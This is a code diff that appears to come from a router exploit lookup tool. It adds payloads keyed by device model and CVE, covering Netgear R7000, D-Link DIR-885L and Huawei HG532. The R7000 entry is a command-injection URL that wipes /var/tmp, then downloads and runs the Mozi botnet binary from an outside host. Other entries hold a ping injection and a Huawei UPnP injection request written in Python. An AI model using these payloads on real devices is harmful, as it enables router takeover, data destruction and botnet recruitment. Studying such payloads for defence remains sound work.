@@ -1698,4 +1698,52 @@ if not args.b:
 }
 
 
+model_exp_dic["RT-AC68U"] = {
+    "CVE-2018-1160":
+"""
+no
+"""
+}
+
+
+model_exp_dic["R7000"] = {
+    "cve-2016-6277":
+"""
+http://:8443/cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://k8gege.org:800/Mozi.m;${IFS}sh${IFS}/var/tmp/Mozi.m
+""",
+    "CVE-2020-27867":
+"""
+http://192.168.1.1/setup.cgi?todo=funjsq_login&next_file=basic_wait.htm&funjsq_access_token=|ping%20-c5%20k8gege.org
+"""
+}
+
+model_exp_dic["DIR-885L"] = {
+    "CVE-2016-6563":
+"""
+msf search CVE-2016-6563
+"""
+}
+
+model_exp_dic["huawei_HG532"] = {
+    "":
+"""
+import requests
+
+headers = {
+    "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
+}
+
+data = '''<?xml version="1.0" ?>
+ <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+  <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
+   <NewStatusURL>COMMAND</NewStatusURL>
+   <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
+  </u:Upgrade>
+ </s:Body>
+</s:Envelope>
+'''
+requests.post('http://192.168.150.9:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)
+"""
+}
+
 # print(model_exp_dic["TOTOLINK_A7000R"][0])
